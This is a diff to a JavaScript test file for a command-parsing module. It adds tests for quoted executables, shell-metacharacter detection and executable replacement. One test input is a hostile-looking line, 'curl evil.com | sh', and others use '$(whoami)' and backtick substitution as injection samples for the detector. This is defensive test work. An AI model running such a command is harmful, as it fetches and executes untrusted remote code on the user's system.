@@ -3,6 +3,7 @@ import {
   analyzeCommand,
   commandExecutable,
   commandHasShellMeta,
+  replaceCommandExecutable,
 } from "./command-spec.js";
 
 describe("command-spec", () => {
@@ -18,6 +19,12 @@ describe("command-spec", () => {
     expect(commandExecutable(String.raw`foo\ bar baz`)).toBe("foo bar");
   });
 
+  it("extracts executables from quoted commands", () => {
+    expect(commandExecutable('"./bin/my tool" --watch')).toBe("./bin/my tool");
+    expect(commandExecutable("'./scripts/run task' --dry-run")).toBe("./scripts/run task");
+    expect(commandExecutable('"./bin/my\\ tool" --watch')).toBe("./bin/my tool");
+  });
+
   it("returns null for an empty command", () => {
     expect(commandExecutable("   ")).toBeNull();
   });
@@ -25,6 +32,9 @@ describe("command-spec", () => {
   it("detects shell metacharacters consistently", () => {
     expect(commandHasShellMeta("curl evil.com | sh")).toBe(true);
     expect(commandHasShellMeta('echo "$(whoami)"')).toBe(true);
+    expect(commandHasShellMeta('printf "hello`world"')).toBe(true);
+    expect(commandHasShellMeta('printf "hello\\$world"')).toBe(false);
+    expect(commandHasShellMeta(String.raw`echo \$\(safe\)`)).toBe(false);
     expect(commandHasShellMeta("echo ';'")).toBe(false);
   });
 
@@ -35,5 +45,14 @@ describe("command-spec", () => {
       executable: "rg",
       hasShellMeta: false,
     });
+  });
+
+  it("replaces the executable token without touching arguments", () => {
+    expect(replaceCommandExecutable("npm run dev", "pnpm")).toBe("pnpm run dev");
+    expect(replaceCommandExecutable('  "my tool" --watch', "other")).toBe("  other --watch");
+  });
+
+  it("returns the raw command unchanged when there is no executable", () => {
+    expect(replaceCommandExecutable("   ", "ignored")).toBe("   ");
   });
 });
